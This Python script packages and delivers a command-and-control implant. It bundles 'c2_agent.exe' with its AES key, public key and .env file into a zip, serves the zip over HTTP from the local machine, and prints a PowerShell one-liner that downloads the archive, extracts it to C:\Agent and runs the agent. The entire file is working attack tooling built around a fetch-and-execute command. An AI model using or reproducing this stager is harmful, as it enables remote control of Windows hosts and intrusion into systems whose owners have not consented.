import os
import shutil
import zipfile
import http.server
import socketserver
import socket
import sys

# Configuration
PORT = 8000
BUILD_DIR = "agent_builds"
SOURCE_ENV = "c2_agent/.env"
DIST_DIR = "dist_agent"
ZIP_NAME = "windows_agent.zip"

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def prepare_files():
    if os.path.exists(DIST_DIR):
        shutil.rmtree(DIST_DIR)
    os.makedirs(DIST_DIR)

    files_to_copy = [
        (os.path.join(BUILD_DIR, "c2_agent.exe"), "c2_agent.exe"),
        (os.path.join(BUILD_DIR, "aes_key.txt"), "aes_key.txt"),
        (os.path.join(BUILD_DIR, "public_key.pem"), "public_key.pem"),
        (SOURCE_ENV, ".env")
    ]

    print(f"[*] Packaging files into {DIST_DIR}...")
    for src, dest_name in files_to_copy:
        if os.path.exists(src):
            shutil.copy(src, os.path.join(DIST_DIR, dest_name))
            print(f"  - Copied {src}")
        else:
            print(f"  ! Warning: {src} not found!")

    # Zip the directory
    shutil.make_archive("windows_agent", 'zip', DIST_DIR)
    print(f"[*] Created {ZIP_NAME}")

def serve_files():
    ip = get_ip()
    url = f"http://{ip}:{PORT}/{ZIP_NAME}"
    
    print("\n" + "="*50)
    print(f"SERVER RUNNING ON: {url}")
    print("="*50)
    print("\n[!] ON YOUR WINDOWS MACHINE, RUN THIS POWERSHELL COMMAND:\n")
    
    ps_command = f'Invoke-WebRequest -Uri "{url}" -OutFile "{ZIP_NAME}"; Expand-Archive -Path "{ZIP_NAME}" -DestinationPath "C:\\Agent" -Force; cd C:\\Agent; .\\c2_agent.exe'
    
    print(ps_command)
    print("\n" + "="*50)
    print("Press Ctrl+C to stop the server after transfer.")

    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Stopping server.")
            httpd.server_close()

if __name__ == "__main__":
    prepare_files()
    serve_files()
